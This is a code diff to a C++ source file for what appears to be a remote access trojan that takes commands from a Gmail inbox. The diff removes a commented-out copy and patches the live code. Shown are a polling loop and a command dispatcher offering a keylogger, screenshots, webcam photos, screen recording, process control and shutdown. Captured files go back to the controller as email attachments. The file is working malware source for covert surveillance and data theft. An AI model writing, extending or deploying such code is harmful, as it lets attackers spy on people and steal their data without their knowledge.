@@ -1,225 +1,3 @@
-// #include "../includes/tasks.h"
-
-// namespace fs = std::filesystem;
-
-// std::string access_token;
-// const std::string script_dir = fs::current_path().parent_path().string() + "/scripts/";
-
-// bool refreshAccessToken() 
-// {
-//     std::string command = "python \"" + script_dir + "refresh_token.py\"";
-//     int result = system(("python \"" + script_dir + "refresh_token.py\"").c_str());
-
-//     if (result != 0)
-//     {
-//         std::cerr << "Failed to refresh access token." << std::endl;
-//         return false;
-//     }
-
-//     std::ifstream in(script_dir + "access_token.txt");
-//     if (!in.is_open()) 
-//     {
-//         std::cerr << "Failed to open access_token.txt." << std::endl;
-//         return false;
-//     }
-
-//     std::getline(in, access_token);
-//     in.close();
-
-//     if (access_token.empty()) 
-//     {
-//         std::cerr << "Access token is empty." << std::endl;
-//         return false;
-//     }
-
-//     std::cout << "Access token refreshed successfully." << std::endl;
-//     return true;
-// }
-
-// std::string readLastEmailCommand()
-// {
-//     std::string command = "python \"" + script_dir + "read_mail.py\"";
-//     int result = system(("python \"" + script_dir + "read_mail.py\"").c_str());
-
-//     if (result != 0)
-//     {
-//         std::cerr << "Failed to read last email command." << std::endl;
-//         return "";
-//     }
-
-//     std::ifstream in(script_dir + "last_command.txt");
-//     if (!in.is_open()) 
-//     {
-//         std::cerr << "Failed to open last command file." << std::endl;
-//         return "";
-//     }
-
-//     std::string cmd;
-//     std::getline(in, cmd);
-//     in.close();
-
-//     if (cmd.empty()) 
-//     {
-//         std::cerr << "Last command is empty." << std::endl;
-//         return "";
-//     }
-
-//     std::cout << "Last command read successfully: " << cmd << std::endl;
-//     return cmd;
-// }
-
-// bool sendEmail(const std::string& subject, const std::string& body)
-// {
-//     std::string command = "python \"" + script_dir + "send_mail.py\" \"" + subject + "\" \"" + body + "\"";
-//     int result = system(command.c_str());
-
-//     if (result != 0)
-//     {
-//         std::cerr << "Failed to send email." << std::endl;
-//         return false;
-//     }
-
-//     std::cout << "Email sent successfully: " << subject << std::endl;
-//     return true;
-// }
-
-// bool sendEmailWithAttachment(const std::string& subject, const std::string& body, const std::string& filepath)
-// {
-//     std::string command = "python \"" + script_dir + "send_mail_with_attachment.py\" \"" + subject + "\" \"" + body + "\" \"" + filepath + "\"";
-//     int result = system(command.c_str());
-
-//     if (result != 0)
-//     {
-//         std::cerr << "Failed to send email with attachment." << std::endl;
-//         return false;
-//     }
-
-//     std::cout << "Email with attachment sent successfully: " << subject << std::endl;
-//     return true;
-// }
-
-// std::string executeCommand(const std::string& cmd)
-// {
-//     if (cmd == "help")
-//     {
-//         return "Available commands:\n"
-//                "  help                    - Show this help message\n"
-//                "  list_services           - List all running services\n"
-//                "  start <path>            - Start a process from given path\n"
-//                "  stop <process_name>     - Stop a process by name\n"
-//                "  list_apps               - List all visible applications\n"
-//                "  start_keylogger         - Start keylogger\n"
-//                "  stop_keylogger          - Stop keylogger\n"
-//                "  screenshot              - Capture screen and save as PNG\n"
-//                "  webcam_photo            - Capture single webcam photo\n"
-//                "  restart                 - Restart the system\n"
-//                "  shutdown                - Shutdown the system\n"
-//                "  start_record            - Start screen recording\n"
-//                "  stop_record             - Stop screen recording\n";
-//     }
-//     else if (cmd == "list_services")
-//     {
-//         return listProcesses();
-//     }
-//     else if (cmd.rfind("start ", 0) == 0)
-//     {
-//         std::string path = cmd.substr(6);
-//         return startProcess(path) ? "Process started successfully." : "Failed to start process.";
-//     }
-//     else if (cmd.rfind("stop ", 0) == 0)
-//     {
-//         std::string name = cmd.substr(5);
-//         return stopProcess(name) ? "Process stopped successfully." : "Failed to stop process.";
-//     }
-//     else if (cmd == "list_apps")
-//     {
-//         return listUserApps();
-//     }
-//     else if (cmd == "start_keylogger")
-//     {
-//         startKeylogger();
-//         return "Keylogger started.";
-//     }
-//     else if (cmd == "stop_keylogger")
-//     {
-//         stopKeylogger();
-//         return "Keylogger stopped.";
-//     }
-//     else if (cmd == "screenshot")
-//     {
-//         std::string filename = "screenshot.png";
-//         return captureScreen(filename) ? filename : "Failed to capture screenshot.";
-//     }
-//     else if (cmd == "webcam_photo")
-//     {
-//         std::string filename = "webcam_photo.jpg";
-//         return captureWebcamPhoto(filename) ? filename : "Failed to capture webcam photo.";
-//     }
-//     else if (cmd == "restart")
-//     {
-//         restartSystem();
-//         return "System is restarting...";
-//     }
-//     else if (cmd == "shutdown")
-//     {
-//         shutdownSystem();
-//         return "System is shutting down...";
-//     }
-//     else if (cmd == "start_record")
-//     {
-//         if (!isRecording())
-//         {
-//             std::string filename = "screen_recording.avi";
-//             startScreenRecording(filename);
-//             return "Recording started: " + filename;
-//         }
-//         else return "Already recording.";
-//     }
-//     else if (cmd == "stop_record")
-//     {
-//         if (isRecording())
-//         {
-//             stopScreenRecording();
-//             return "Recording stopped.";
-//         }
-//         else return "No recording in progress.";
-//     }
-//     return "Unknown command: " + cmd;
-// }
-
-// void startGmailControlLoop()
-// {
-//     while (true)
-//     {
-//         if (!refreshAccessToken())
-//         {
-//             std::cerr << "[Gmail] Failed to refresh token." << std::endl;
-//             std::this_thread::sleep_for(std::chrono::minutes(10));
-//             continue;
-//         }
-
-//         std::string cmd = readLastEmailCommand();
-//         if (!cmd.empty())
-//         {
-//             std::string response = executeCommand(cmd);
-
-//             auto ends_with = [](const std::string& str, const std::string& suffix) {
-//                 return str.size() >= suffix.size() && str.compare(str.size() - suffix.size(), suffix.size(), suffix) == 0;
-//             };
-//             if (ends_with(response, ".png") || ends_with(response, ".jpg") || ends_with(response, ".avi"))
-//             {
-//                 sendEmailWithAttachment("Command Result", "Result of command: " + cmd, response);
-//             }
-//             else
-//             {
-//                 sendEmail("Command Result", response);
-//             }
-//         }
-//         std::this_thread::sleep_for(std::chrono::seconds(10));
-//     }
-// }
-
-
 #include "../includes/tasks.h"
 #include <filesystem>
 #include <fstream>
@@ -231,6 +9,8 @@ namespace fs = std::filesystem;
 
 std::string access_token;
 const std::string script_dir = fs::current_path().parent_path().string() + "/scripts/";
+const std::string exe_dir = fs::current_path().string() + "/";
+
 
 bool refreshAccessToken()
 {
@@ -308,7 +88,7 @@ bool sendEmail(const std::string& subject, const std::string& body)
 
 bool sendEmailWithAttachment(const std::string& subject, const std::string& body, const std::string& filepath)
 {
-    std::string command = "python \"" + script_dir + "send_mail_with_attachment.py\" \"" + subject + "\" \"" + body + "\" \"" + filepath + "\"";
+    std::string command = "python \"" + script_dir + "send_email_with_attachment.py\" \"" + subject + "\" \"" + filepath + "\"";
     int result = system(command.c_str());
 
     if (result != 0)
@@ -343,7 +123,7 @@ std::string executeCommand(const std::string& cmd)
     else if (cmd == "list_services")
     {
         std::string content = listProcesses();
-        std::string filename = "process_list.txt";
+        std::string filename = fs::current_path().string() + "/process_list.txt";
         std::ofstream out(filename);
         out << content;
         out.close();
@@ -375,12 +155,12 @@ std::string executeCommand(const std::string& cmd)
     }
     else if (cmd == "screenshot")
     {
-        std::string filename = "screenshot.png";
+        std::string filename = fs::current_path().string() + "\\screenshot.png";
         return captureScreen(filename) ? filename : "Failed to capture screenshot.";
     }
     else if (cmd == "webcam_photo")
     {
-        std::string filename = "webcam_photo.jpg";
+        std::string filename = fs::current_path().string() + "/webcam_photo.jpg";
         return captureWebcamPhoto(filename) ? filename : "Failed to capture webcam photo.";
     }
     else if (cmd == "restart")
@@ -397,7 +177,7 @@ std::string executeCommand(const std::string& cmd)
     {
         if (!isRecording())
         {
-            std::string filename = "screen_recording.avi";
+            std::string filename = fs::current_path().string() + "/screen_recording.avi";
             startScreenRecording(filename);
             return filename;
         }
@@ -437,12 +217,17 @@ void startGmailControlLoop()
                        str.compare(str.size() - suffix.size(), suffix.size(), suffix) == 0;
             };
 
-            if ((ends_with(response, ".png") || ends_with(response, ".jpg") ||
-                 ends_with(response, ".avi") || ends_with(response, ".txt")) &&
-                std::filesystem::exists(response))
+            if (ends_with(response, ".png") || ends_with(response, ".jpg") || ends_with(response, ".avi") || ends_with(response, ".txt"))
             {
-                sendEmailWithAttachment("Command Result", "Result of command: " + cmd, response);
+                std::string filepath = exe_dir + response;
+                if (!fs::exists(filepath)) {
+                    std::cerr << "Attachment not found: " << filepath << std::endl;
+                    sendEmail("Command Result", "Result: " + response + "\n(Attachment file missing: " + filepath + ")");
+                } else {
+                    sendEmailWithAttachment("Command Result", "Result of command: " + cmd, filepath);
+                }
             }
+
             else
             {
                 sendEmail("Command Result", response);
